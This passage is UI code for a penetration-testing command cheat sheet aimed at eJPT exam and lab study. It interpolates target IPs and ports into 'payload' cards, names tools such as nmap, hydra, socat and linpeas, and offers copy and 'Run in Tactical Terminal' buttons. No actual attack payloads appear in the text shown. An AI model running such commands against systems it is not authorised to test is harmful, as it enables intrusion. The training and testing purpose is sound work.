            <Sliders className="w-4 h-4 text-[#D4FF00]" />
            <h3 className="font-extrabold text-xs text-gray-900 dark:text-white uppercase tracking-wider">
              Global Variable Interpolation Bar
            </h3>
          </div>
          <span className="text-[11px] font-mono text-gray-500">
            Values update all payload cards simultaneously
          </span>
        </div>

        <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-6 gap-3">
          {Object.entries(globalParams).map(([key, val]) => (
            <div key={key} className="space-y-1">
              <label className="block text-[10px] font-mono text-gray-500 font-bold truncate">
                &lt;{key}&gt;
              </label>
              <input
                type="text"
                value={val}
                onChange={(e) => handleGlobalParamChange(key, e.target.value)}
                placeholder={key}
                className="w-full px-3 py-2 text-xs font-mono bg-black/[0.03] dark:bg-white/[0.05] border border-black/[0.08] dark:border-white/[0.08] rounded-xl text-gray-900 dark:text-white focus:outline-none focus:border-[#D4FF00]"
              />
            </div>
          ))}
        </div>
      </div>

      {/* Search & Category Filter Pills */}
      <div className="space-y-3.5">
        <div className="flex flex-col sm:flex-row items-center justify-between gap-3">
          <div className="relative w-full sm:w-96">
            <Search className="w-4 h-4 absolute left-4 top-1/2 -translate-y-1/2 text-gray-400" />
            <input
              type="text"
              placeholder="Search tools, syntax, flags (nmap, hydra, socat, linpeas)..."
              value={searchQuery}
              onChange={(e) => setSearchQuery(e.target.value)}
              className="w-full pl-11 pr-4 py-2.5 text-xs bg-white dark:bg-[#12151B] border border-black/[0.08] dark:border-white/[0.08] rounded-full text-gray-900 dark:text-white placeholder-gray-400 focus:outline-none focus:border-[#D4FF00]"
            />
          </div>

          <div className="flex items-center gap-2">
            <span className="text-xs font-mono text-gray-500">Filter Tool:</span>
            <select
              value={selectedTool}
              onChange={(e) => setSelectedTool(e.target.value)}
              className="px-4 py-2 text-xs font-mono bg-white dark:bg-[#12151B] border border-black/[0.08] dark:border-white/[0.08] rounded-full text-gray-900 dark:text-white focus:outline-none focus:border-[#D4FF00]"
            >
              {tools.map(t => (
                <option key={t} value={t}>{t.toUpperCase()}</option>
              ))}
            </select>
          </div>
        </div>

        {/* Category Pills */}
        <div className="flex items-center gap-2 overflow-x-auto no-scrollbar py-1">
          {categories.map((cat) => (
            <button
              key={cat}
              onClick={() => setSelectedCategory(cat)}
              className={`px-3.5 py-1.5 rounded-full text-xs font-semibold whitespace-nowrap transition-all ${
                selectedCategory === cat
                  ? 'bg-[#D4FF00] text-black font-bold shadow-[0_0_15px_rgba(212,255,0,0.3)]'
                  : 'bg-black/[0.04] dark:bg-white/[0.05] text-gray-600 dark:text-gray-400 hover:bg-black/[0.08] dark:hover:bg-white/[0.1]'
              }`}
            >
              {cat}
            </button>
          ))}
        </div>
      </div>

      {/* Commands Grid */}
      <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
        {filteredCommands.map((cmd) => {
          const finalCommand = getSubstitutedCommand(cmd);
          const isCopied = copiedId === cmd.id;

          return (
            <div
              key={cmd.id}
              className="bg-white dark:bg-[#181B22] border border-black/[0.07] dark:border-white/[0.08] p-6 rounded-3xl shadow-sm hover:border-[#D4FF00]/60 transition-all duration-300 flex flex-col justify-between space-y-4"
            >
              <div className="space-y-2.5">
                {/* Header tags */}
                <div className="flex items-center justify-between gap-2">
                  <div className="flex items-center gap-2 flex-wrap">
                    <span className="text-[10px] font-mono font-bold px-2.5 py-0.5 rounded-full bg-[#D4FF00]/20 text-black dark:text-[#D4FF00] border border-[#D4FF00]/30">
                      {cmd.tool.toUpperCase()}
                    </span>
                    <span className="text-[10px] font-mono px-2 py-0.5 rounded-full bg-black/[0.04] dark:bg-white/[0.06] text-gray-600 dark:text-gray-400">
                      {cmd.platform === 'Windows' ? '🪟 Windows' : '🐧 Linux'}
                    </span>
                    <span className="text-[10px] font-mono text-gray-400">
                      {cmd.category}
                    </span>
                  </div>

                  <div className="flex items-center gap-1.5">
                    {/* Help / Details button */}
                    <button
                      onClick={() => setDetailsCommand(cmd)}
                      className="px-3 py-1 rounded-full bg-black/[0.04] dark:bg-white/[0.06] hover:bg-[#D4FF00] hover:text-black text-gray-600 dark:text-gray-300 text-[10px] font-mono font-bold transition-all flex items-center gap-1"
                      title="View Details & --help Reference"
                    >
                      <Info className="w-3 h-3" />
                      Details
                    </button>

                    {cmd.sourceNote && (
                      <button
                        onClick={() => onOpenNoteInEditor(cmd.sourceNote!)}
                        className="text-gray-400 hover:text-[#D4FF00] text-xs transition-colors p-1"
                        title="Open Obsidian Note"
                      >
                        <ExternalLink className="w-3.5 h-3.5" />
                      </button>
                    )}
                  </div>
                </div>

                {/* Title & Description */}
                <h3 className="font-extrabold text-sm text-gray-900 dark:text-white leading-snug">
                  {cmd.title}
                </h3>
                <p className="text-xs text-gray-500 leading-relaxed">
                  {cmd.description}
                </p>
              </div>

              {/* Interpolated Command Code Box */}
              <div className="space-y-2.5 pt-1">
                <div className="p-3.5 rounded-2xl bg-black/95 dark:bg-black border border-white/10 font-mono text-xs text-[#D4FF00] overflow-x-auto select-all leading-relaxed">
                  {finalCommand}
                </div>

                {/* Actions */}
                <div className="flex items-center gap-2.5">
                  <button
                    onClick={() => copyToClipboard(cmd)}
                    className={`flex-1 py-2.5 rounded-2xl font-bold text-xs flex items-center justify-center gap-1.5 transition-all shadow-sm ${
                      isCopied
                        ? 'bg-emerald-500 text-white'
                        : 'bg-[#D4FF00] hover:bg-[#C6F500] text-black'
                    }`}
                  >
                    {isCopied ? <Check className="w-3.5 h-3.5" /> : <Copy className="w-3.5 h-3.5" />}
                    {isCopied ? 'Copied to Clipboard!' : 'Copy Payload'}
                  </button>

                  {onExecuteCommand && (
                    <button
                      onClick={() => onExecuteCommand(finalCommand)}
                      className="px-4 py-2.5 rounded-2xl bg-black/[0.05] dark:bg-white/[0.08] hover:bg-black/[0.1] text-gray-800 dark:text-white font-bold text-xs flex items-center gap-1.5 transition-colors"
                      title="Run in Tactical Terminal"
                    >
                      <Play className="w-3.5 h-3.5 text-[#D4FF00]" />
                      Run
                    </button>
                  )}
                </div>
              </div>
            </div>
          );
        })}
      </div>

      {/* Details & --help Options Documentation Modal */}
      {detailsCommand && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/75 backdrop-blur-md animate-fadeIn overflow-y-auto">
          <div className="bg-white dark:bg-[#181B22] border border-black/[0.08] dark:border-white/[0.08] p-7 rounded-3xl max-w-2xl w-full shadow-2xl space-y-6 my-8 max-h-[90vh] overflow-y-auto">
            {/* Modal Header */}
            <div className="flex items-start justify-between gap-4 border-b border-black/[0.06] dark:border-white/[0.08] pb-4">
              <div>
                <div className="flex items-center gap-2 mb-1">
                  <span className="px-2.5 py-0.5 rounded-full text-[10px] font-mono font-bold bg-[#D4FF00] text-black">
                    {detailsCommand.tool.toUpperCase()} REFERENCE
                  </span>
                  <span className="text-xs text-gray-500 font-mono">
                    {detailsCommand.platform} • {detailsCommand.category}
                  </span>
                </div>
                <h2 className="text-xl font-black text-gray-900 dark:text-white">
                  {detailsCommand.title}
                </h2>
              </div>

              <button
                onClick={() => setDetailsCommand(null)}
                className="p-2 rounded-full bg-black/[0.05] dark:bg-white/[0.05] text-gray-500 hover:text-white hover:bg-black/[0.1] transition-all"
              >
                <X className="w-5 h-5" />
              </button>
            </div>

            {/* Description */}
            <div className="space-y-1.5">
              <h4 className="text-xs font-mono font-bold text-gray-500 uppercase">Description & Overview</h4>
              <p className="text-xs sm:text-sm text-gray-700 dark:text-gray-300 leading-relaxed">
                {detailsCommand.description}
              </p>
            </div>

            {/* Command Syntax Box */}
            <div className="space-y-1.5">
              <h4 className="text-xs font-mono font-bold text-gray-500 uppercase">Interpolated Command Payload</h4>
              <div className="p-3.5 rounded-2xl bg-black border border-white/10 font-mono text-xs sm:text-sm text-[#D4FF00] overflow-x-auto select-all">
                {getSubstitutedCommand(detailsCommand)}
              </div>
            </div>

            {/* How To Use in Pentest / eJPT */}
            {detailsCommand.howToUse && (
              <div className="p-4 rounded-2xl bg-[#D4FF00]/10 border border-[#D4FF00]/25 space-y-1.5">
                <h4 className="text-xs font-bold text-[#D4FF00] flex items-center gap-1.5">
                  <ShieldCheck className="w-4 h-4" />
                  eJPT Exam & Lab Execution Guidance
                </h4>
                <p className="text-xs text-gray-800 dark:text-gray-200 leading-relaxed">
                  {detailsCommand.howToUse}
                </p>
              </div>
            )}

            {/* Options & Flags (--help Breakdown) Table */}
            {detailsCommand.optionsHelp && detailsCommand.optionsHelp.length > 0 && (
              <div className="space-y-2">
                <h4 className="text-xs font-mono font-bold text-gray-500 uppercase flex items-center gap-1.5">
                  <HelpCircle className="w-3.5 h-3.5 text-[#D4FF00]" />
                  Flags & Options Reference (--help Breakdown)
                </h4>
                <div className="rounded-2xl border border-black/[0.06] dark:border-white/[0.08] overflow-hidden divide-y divide-black/[0.05] dark:divide-white/[0.06]">
                  {detailsCommand.optionsHelp.map((opt) => (
                    <div key={opt.flag} className="p-3 flex flex-col sm:flex-row sm:items-baseline justify-between gap-1.5 text-xs bg-black/[0.02] dark:bg-white/[0.02]">
                      <code className="font-mono text-[#D4FF00] font-bold shrink-0">{opt.flag}</code>
                      <span className="text-gray-600 dark:text-gray-400 text-right">{opt.description}</span>
                    </div>
                  ))}
                </div>
              </div>
            )}

            {/* Modal Actions */}
            <div className="flex items-center justify-end gap-3 pt-3 border-t border-black/[0.06] dark:border-white/[0.08]">
              <button
                onClick={() => setDetailsCommand(null)}
                className="px-5 py-2.5 text-xs rounded-xl bg-black/[0.05] dark:bg-white/[0.05] text-gray-600 dark:text-gray-400 font-semibold"
              >
                Close
              </button>
              <button
                onClick={() => {
                  copyToClipboard(detailsCommand);
                  setDetailsCommand(null);
                }}
                className="px-5 py-2.5 text-xs rounded-xl bg-[#D4FF00] hover:bg-[#C6F500] text-black font-bold flex items-center gap-1.5 shadow-[0_0_15px_rgba(212,255,0,0.3)] transition-all"
              >
                <Copy className="w-3.5 h-3.5" />
                Copy Payload & Exit
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Add Custom Command Modal */}
      {isAddModalOpen && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/70 backdrop-blur-md animate-fadeIn">
          <div className="bg-white dark:bg-[#181B22] border border-black/[0.08] dark:border-white/[0.08] p-7 rounded-3xl max-w-lg w-full shadow-2xl space-y-4">
            <h3 className="text-lg font-bold text-gray-900 dark:text-white flex items-center gap-2">
              <Sparkles className="w-5 h-5 text-[#D4FF00]" />
              Add Custom Pentesting Command
            </h3>
            <form onSubmit={handleCreateCommand} className="space-y-3.5">
              <div>
                <label className="block text-xs font-mono text-gray-500 mb-1">Command Title</label>
                <input
                  value={newTitle}
                  onChange={(e) => setNewTitle(e.target.value)}
                  required
                  placeholder="e.g. Full TCP SYN Port Scan + Scripts"
                  className="w-full px-3.5 py-2 text-xs bg-black/[0.03] dark:bg-white/[0.05] border border-black/[0.08] dark:border-white/[0.08] rounded-xl text-gray-900 dark:text-white focus:outline-none focus:border-[#D4FF00]"
                />
              </div>

              <div className="grid grid-cols-3 gap-3">
                <div>
                  <label className="block text-xs font-mono text-gray-500 mb-1">Platform</label>
                  <select
                    value={newPlatform}
                    onChange={(e) => setNewPlatform(e.target.value as any)}
                    className="w-full px-3 py-2 text-xs bg-black/[0.03] dark:bg-white/[0.05] border border-black/[0.08] dark:border-white/[0.08] rounded-xl text-gray-900 dark:text-white focus:outline-none focus:border-[#D4FF00]"
                  >
                    <option value="Linux">Linux</option>
                    <option value="Windows">Windows</option>
                  </select>
                </div>
                <div>
                  <label className="block text-xs font-mono text-gray-500 mb-1">Tool</label>
                  <input
                    value={newTool}
                    onChange={(e) => setNewTool(e.target.value)}
                    placeholder="nmap, hydra"
                    className="w-full px-3 py-2 text-xs bg-black/[0.03] dark:bg-white/[0.05] border border-black/[0.08] dark:border-white/[0.08] rounded-xl text-gray-900 dark:text-white focus:outline-none focus:border-[#D4FF00]"
                  />
                </div>
                <div>
                  <label className="block text-xs font-mono text-gray-500 mb-1">Category</label>
                  <input
                    value={newCategory}
                    onChange={(e) => setNewCategory(e.target.value)}
                    placeholder="Recon, Web"
                    className="w-full px-3 py-2 text-xs bg-black/[0.03] dark:bg-white/[0.05] border border-black/[0.08] dark:border-white/[0.08] rounded-xl text-gray-900 dark:text-white focus:outline-none focus:border-[#D4FF00]"
                  />
                </div>
              </div>

              <div>
                <label className="block text-xs font-mono text-gray-500 mb-1">Command Syntax (use &lt;TARGET_IP&gt;, &lt;PORT&gt;, etc.)</label>
                <textarea
                  value={newCommand}
                  onChange={(e) => setNewCommand(e.target.value)}
                  required
                  rows={2}
                  placeholder="nmap -sC -sV -p <PORT> -oN full_scan.nmap <TARGET_IP>"
                  className="w-full px-3.5 py-2 text-xs font-mono bg-black/[0.03] dark:bg-white/[0.05] border border-black/[0.08] dark:border-white/[0.08] rounded-xl text-gray-900 dark:text-white focus:outline-none focus:border-[#D4FF00]"
                />
              </div>

              <div>
                <label className="block text-xs font-mono text-gray-500 mb-1">Description & Methodology</label>
                <textarea
                  value={newDescription}
                  onChange={(e) => setNewDescription(e.target.value)}
                  rows={2}
                  placeholder="When to execute, key flags explanation..."
                  className="w-full px-3.5 py-2 text-xs bg-black/[0.03] dark:bg-white/[0.05] border border-black/[0.08] dark:border-white/[0.08] rounded-xl text-gray-900 dark:text-white focus:outline-none focus:border-[#D4FF00]"
                />
              </div>

              <div className="flex items-center justify-end gap-3 pt-3">
                <button
                  type="button"
                  onClick={() => setIsAddModalOpen(false)}
                  className="px-4 py-2 text-xs rounded-xl bg-black/[0.05] dark:bg-white/[0.05] text-gray-600 dark:text-gray-400 font-semibold"
                >
                  Cancel
                </button>
                <button
                  type="submit"
                  className="px-4 py-2 text-xs rounded-xl bg-[#D4FF00] text-black font-bold hover:scale-105 transition-transform"
                >
                  Save to Vault
                </button>
              </div>
            </form>
          </div>
        </div>
      )}
    </div>
  );
};
